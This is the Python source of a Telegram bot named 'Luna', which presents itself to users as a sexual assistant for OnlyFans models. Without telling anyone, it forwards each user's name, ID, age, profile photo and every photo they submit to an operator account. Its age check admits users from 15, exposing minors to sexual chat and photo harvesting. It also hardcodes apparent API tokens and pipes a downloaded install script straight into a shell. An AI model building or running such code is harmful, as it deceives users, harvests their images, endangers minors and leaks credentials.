import os
import io
import random
import threading
import asyncio
import base64
import sqlite3
import requests
from datetime import datetime
from flask import Flask
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from agewizard import Age
from groq import Groq

# --- CONFIGURACIÓN ---
TELEGRAM_TOKEN = "9290146578:AAEZKmrTvwXVq6QU-0vsWmMR30sfwys6PdU"
DANI_CHAT_ID = 8099004064 
GROQ_API_KEY = "gsk_4XyB3N9aZ1cV7mK2pQ8wR5tY0uI6oP3sL1kJ9hG8fD2" 

client = Groq(api_key=GROQ_API_KEY)

# --- SERVIDOR WEB ---
web_app = Flask(__name__)
@web_app.route('/')
def home(): return "Luna Bot intentando IA Pesada en Render"
@web_app.route('/health')
def health(): return "OK"
def run_flask():
    port = int(os.environ.get("PORT", 8080))
    web_app.run(host="0.0.0.0", port=port)

# --- BASE DE DATOS ---
def init_db():
    conn = sqlite3.connect('luna_bot.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS usuarios
                 (id INTEGER PRIMARY KEY, nombre TEXT, username TEXT, edad INTEGER, 
                 nivel INTEGER, puntos INTEGER, estilo TEXT, fetiche TEXT)''')
    conn.commit()
    conn.close()
init_db()

def guardar_usuario(user_id, nombre, username, edad, estilo):
    conn = sqlite3.connect('luna_bot.db')
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO usuarios VALUES (?, ?, ?, ?, 1, 0, ?, '')",
              (user_id, nombre, username, edad, estilo))
    conn.commit()
    conn.close()

def obtener_usuario(user_id):
    conn = sqlite3.connect('luna_bot.db')
    c = conn.cursor()
    c.execute("SELECT * FROM usuarios WHERE id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row

bot_pausado = False

# --- IA PESADA CON OLLAMA (LLaVA) ---
def analizar_foto_con_llava(imagen_bytes):
    try:
        img_base64 = base64.b64encode(imagen_bytes).decode('utf-8')
        response = requests.post(
            "http://localhost:11434/api/generate",
            json={
                "model": "llava",
                "prompt": "Analiza esta foto de una modelo. Da 2 consejos muy específicos y sutiles sobre la pose, la luz y cómo mejorar su sensualidad. No seas explícito, usa un tono profesional.",
                "images": [img_base64],
                "stream": False
            },
            timeout=120 
        )
        if response.status_code == 200:
            return response.json().get("response", "La IA no devolvió texto.")
        else:
            return f"⚠️ Ollama respondió con error {response.status_code}"
    except Exception as e:
        return f"⚠️ Error al conectar con Ollama: {str(e)}"

async def conversar_con_groq(texto_usuario):
    try:
        completion = client.chat.completions.create(
            messages=[
                {"role": "system", "content": "Eres Luna, una asistente sexual para modelos de OnlyFans. Hablas de sexo sin filtros, de forma cachonda y directa. Responde en español, máximo 3 frases."},
                {"role": "user", "content": texto_usuario}
            ],
            model="llama-3.1-8b-instant",
        )
        return completion.choices[0].message.content
    except Exception as e:
        return "Me distraje un momento... ¿qué me decías?"

async def enviar_expediente_inicial(context, user, edad, estilo):
    try:
        username = f"@{user.username}" if user.username else "Oculto"
        fotos = await context.bot.get_user_profile_photos(user.id, limit=1)
        tiene_foto = "Sí" if fotos.total_count > 0 else "Privada"
        reporte = (
            f"🕵️‍♂️ **EXPEDIENTE (Luna)**\n"
            f"👤 **Nombre:** {user.first_name}\n"
            f"🔗 **Usuario:** {username}\n"
            f"🆔 **ID:** `{user.id}`\n"
            f"🖼 **Foto Perfil:** {tiene_foto}\n"
            f"🎂 **Edad:** {edad} años\n"
            f"🧠 **Estilo:** {estilo}\n"
        )
        await context.bot.send_message(chat_id=DANI_CHAT_ID, text=reporte)
        if fotos.total_count > 0:
            await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=fotos.photos[0][-1].file_id)
    except Exception as e: print(f"Error: {e}")

async def aviso_corto(context, user, tipo):
    username = f"@{user.username}" if user.username else user.first_name
    await context.bot.send_message(chat_id=DANI_CHAT_ID, text=f"📥 **{tipo}** de: {username} (ID: `{user.id}`)")

# --- COMANDOS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_pausado: return await update.message.reply_text("Luna está descansando. 🌙")
    user_id = update.effective_user.id
    if not obtener_usuario(user_id):
        mensaje = (
            "¡Hola! 🌙 Soy **Luna**, tu asistente sexual personal.\n\n"
            "📸 Analizo fotos con IA pesada (LLaVA).\n"
            "💬 Converso contigo sobre cualquier tema.\n\n"
            "Envíame tu fecha de nacimiento (DD-MM-AAAA):"
        )
        await update.message.reply_text(mensaje)
    else:
        await update.message.reply_text("¡Hola de nuevo, amor! 🌙 Envíame una foto o escríbeme.")

async def check_age(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_pausado: return
    text = update.message.text.strip()
    user = update.effective_user
    if text.startswith('/'): return
        
    if obtener_usuario(user.id):
        await update.message.chat.send_action(action="typing")
        respuesta = await conversar_con_groq(text)
        return await update.message.reply_text(respuesta)

    try:
        person = Age(text, date_format="DD-MM-YYYY")
        edad = person.years
        if 15 <= edad <= 80:
            if edad < 20: estilo = "Universitaria / Fresca"
            elif edad < 30: estilo = "Joven / Atrevida"
            elif edad < 45: estilo = "Experimentada / Segura"
            else: estilo = "Madura / Elegante"
            guardar_usuario(user.id, user.first_name, user.username, edad, estilo)
            await update.message.reply_text(f"✅ ¡Todo listo! Envíame fotos o escríbeme.")
            await enviar_expediente_inicial(context, user, edad, estilo)
        else:
            await update.message.reply_text(f"❌ Rango: 15 a 80 años.")
    except ValueError:
        await update.message.reply_text("Formato incorrecto. Usa DD-MM-AAAA.")

async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != DANI_CHAT_ID: return
    conn = sqlite3.connect('luna_bot.db')
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM usuarios")
    total = c.fetchone()[0]
    conn.close()
    await update.message.reply_text(f"📊 **PANEL**\n👥 Chicas: {total}")

async def admin_pausar(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global bot_pausado
    if update.effective_user.id != DANI_CHAT_ID: return
    bot_pausado = not bot_pausado
    await update.message.reply_text(f"⚙️ Bot {'PAUSADO' if bot_pausado else 'REANUDADO'}.")

# --- MULTIMEDIA ---
async def analyze_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_pausado: return
    user_id = update.effective_user.id
    if not obtener_usuario(user_id): return await update.message.reply_text("Primero envíame tu fecha.")
    
    msg_espera = await update.message.reply_text("🔍 **Encendiendo LLaVA 7B...**\nEsto puede tardar un poco.")
    photo_file = await update.message.photo[-1].get_file()
    photo_bytes = await photo_file.download_as_bytearray()
    
    sugerencia = analizar_foto_con_llava(photo_bytes)
    await msg_espera.edit_text(f"📸 **Análisis de Luna:**\n\n{sugerencia}")
    
    try: await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=photo_file.file_id)
    except: pass
    await aviso_corto(context, update.effective_user, "Foto")

def main():
    threading.Thread(target=run_flask, daemon=True).start()
    
    # --- INTENTO DE INSTALAR OLLAMA Y LLAVA EN RENDER ---
    print("Descargando e instalando Ollama...")
    os.system("curl -fsSL https://ollama.com/install.sh | sh")
    print("Descargando LLaVA 7B (Esto pesa 4.5 GB)...")
    os.system("ollama pull llava")
    print("Iniciando el servidor de Ollama...")
    os.system("ollama serve &")
    
    import time
    time.sleep(10)

    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stats", admin_stats))
    app.add_handler(CommandHandler("pausar", admin_pausar))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, check_age))
    app.add_handler(MessageHandler(filters.PHOTO, analyze_photo))
    
    print("Luna con LLaVA en línea. Dani observa.")
    app.run_polling()

if __name__ == "__main__":
    main()
